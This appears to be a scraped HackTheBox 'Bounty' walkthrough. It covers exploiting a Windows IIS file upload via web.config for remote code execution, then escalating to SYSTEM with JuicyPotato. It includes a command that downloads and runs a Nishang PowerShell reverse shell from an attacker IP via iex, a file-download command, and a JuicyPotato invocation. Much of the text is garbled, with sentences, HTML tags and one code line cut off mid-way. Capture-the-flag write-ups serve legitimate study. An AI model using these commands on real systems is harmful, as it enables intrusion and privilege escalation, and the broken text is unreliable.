12:T328d,<figure><img src="/writing/media/458127b41ff4f08a7646ee5b.webp" alt="HackTheBox “Bounty” Walkthrough, figure 1" width="1200" height="909" loading="lazy" decoding="async" /></figure><p>Bounty, an easy-level Windows OS machine on HackTheBox, a straightforward Windows challenge, where the objective was to exploit a Windows ASP web server by uploading a web.config file. This allowed for remote code execution, and by leveraging token impersonation technique, the goal was to escalate privileges to the system level.</p><p>Let’s get started! 🚀</p><h2 id="recon-and-enumeration">Recon &amp; Enumeration</h2><p>Let’s use nmap to scan for open ports and services:</p><figure><img src="/writing/media/9235233ea933e8765b7230a3.webp" alt="HackTheBox “Bounty” Walkthrough, figure 2" width="948" height="569" loading="lazy" decoding="async" /></figure><p>Visit the target on port 80.</p><figure><img src="/writing/media/90bd9be02f43df0bb2224bc3.webp" alt="HackTheBox “Bounty” Walkthrough, figure 3" width="612" height="521" loading="lazy" decoding="async" /></figure><p>Perform a directory scan on the Microsoft IIS server using the “Feroxbuster” tool. Utilize a larger wordlist built in Kali machine targeting the extensions asp, aspx, and txt using the following command:</p><p><code>feroxbuster -u http://10.10.10.93/ -x asp,aspx,txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 100 -s 200,301 -n</code></p><figure><img src="/writing/media/7745c80eb6f743d7fa99cdd2.webp" alt="HackTheBox “Bounty” Walkthrough, figure 4" width="958" height="536" loading="lazy" decoding="async" /></figure><p>Visit the <em>transfer.aspx</em> page.</p><figure><img src="/writing/media/1da553a4e18333d120818e33.webp" alt="HackTheBox “Bounty” Walkthrough, figure 5" width="477" height="149" loading="lazy" decoding="async" /></figure><p>The website has a file upload feature. When we try to upload a PNG file, the site confirms its successful upload, and the image can be viewed at <code>http://10.10.10.93/UploadedFiles/[image name]</code> which is the second directory discovered by Feroxbuster above.</p><p>Browse for the Bounty machine info image.</p><figure><img src="/writing/media/e53c1cbd9ce1e45240ca1894.webp" alt="HackTheBox “Bounty” Walkthrough, figure 6" width="463" height="121" loading="lazy" decoding="async" /></figure><p>Upload.</p><figure><img src="/writing/media/83cff0c09f91c5475f38e0a0.webp" alt="HackTheBox “Bounty” Walkthrough, figure 7" for intercepting the upload request of the bounty information image.</p><figure><img src="/writing/media/295cc1176d66a97a5f58d8b9.webp" alt="HackTheBox “Bounty” Walkthrough, figure 9" width="1200" height="910" loading="lazy" decoding="async" /></figure><p>Send it to the Intruder.</p><figure><img src="/writing/media/94a9710441029f35119ce23b.webp" alt="HackTheBox “Bounty” Walkthrough, figure 10" raft-small-extensions.txt wordlist from [<a href="https://github.com/danielmiessler/SecLists" rel="nofollow noopener noreferrer" target="_blank">SecLists</a>] and move it to the working prevent URL encoding in Burp, use the “Cut” tool to remove the dots.</p><figure><img src="/writing/media/fe36883f26b9d8f9ece53601.webp" alt="HackTheBox “Bounty” Walkthrough, figure 13" width="517" (RCE) by exploiting the file upload functionality. To proceed, we will download the file to our attack box and configure it with the appropriate path for downloading the Nishang Invoke-PowerShellTcp PowerShell script.</p><figure><img /></figure><p>And we get a shell on our listener.</p><figure><img src="/writing/media/f27e8d91406255b7a83ec02f.webp" alt="HackTheBox “Bounty” Walkthrough, figure 24" width="534" height="161" 25" width="790" height="671" loading="lazy" decoding="async" /></figure><p>The obtained information reveals valuable details. Firstly, the OS is Windows Server 2008 R2 without any installed hotfixes, indicating vulnerability to a kernel exploit. Moreover, it confirms that the host operates on a 64-bit system, which is pertinent when utilizing tools.</p><p>Subsequently, I proceeded to collect information about the current user’s privileges using the following command:</p><figure><img src="/writing/media/c1dc3dc1928a2a2b83d63355.webp" alt="HackTheBox “Bounty” Walkthrough, figure 26" width="674" height="270" loading="lazy" decoding="async" /></figure><p>The finding of enabled SeImpersonatePrivilege implies that I can leverage a potato attack to escalate privileges to SYSTEM.</p><figure><img src="/writing/media/62e0bdc4c2e247f1471cbb7e.webp" alt="HackTheBox “Bounty” Walkthrough, figure 27" width="637" height="798" loading="lazy" decoding="async" /></figure><p>Obtain a copy of JuicyPotato.exe from this GitHub repository <a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1" rel="nofollow noopener noreferrer" target="_blank">here</a>, ensure to acquire the 64-bit /></figure><p>Meanwhile, our HTTP server in the working directory of our attacking box remains operational.</p><p>Create a temp directory within the C partition and proceed to download JuicyPotato '\temp\JuicyPotato.exe')pla</code></pre><figure><img src="/writing/media/11b1da8861d760975ee2df7d.webp" alt="HackTheBox “Bounty” Walkthrough, figure 29" width="958" height="272" loading="lazy" decoding="async" /></figure><p>Let’s run the exploit.</p><figure><img src="/writing/media/28645bd5f6b43d268810b6d1.webp" alt="HackTheBox “Bounty” Walkthrough, figure 30" width="777" height="292" loading="lazy" decoding="async" /></figure><p>In order to run the tool successfully, we require a port number for the COM server and a valid CLSID. There are two options: either use the provided list by the tool authors corresponding to the system version or execute the following PowerShell script to extract the CLSID of the current system:</p><p><a href="https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/GetCLSID.ps1" rel="nofollow noopener noreferrer" target="_blank">GetCLSID.ps1 script</a></p><p>I will use a batch script to download the Nishang PowerShell script. On the attacker machine, use the following command to craft a batch script:</p><pre><code data-language="text">echo "powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.8:8080/Invoke-PowerShellTcp.ps1')" &gt; shell.bat</code></pre><figure><img src="/writing/media/793c432d5bbc68e47cfded51.webp" alt="HackTheBox “Bounty” Walkthrough, figure 31" width="944" height="139" loading="lazy" decoding="async" /></figure><p>Download the batch script onto the target box using the command below.</p><pre><code data-language="text">(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.8:8080/shell.bat', '\temp\shell.bat')</code></pre><figure><img src="/writing/media/e9444d1c268e684aceb8d52a.webp" alt="HackTheBox “Bounty” Walkthrough, figure 32" width="924" height="217" loading="lazy" decoding="async" /></figure><p>The setup is complete, and we are ready to proceed with the exploit. first CLSID from the list.</p><pre><code data-language="text">./JuicyPotato.exe -l 4343 -p C:\temp\shell.bat -t * -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"</code></pre><figure><img
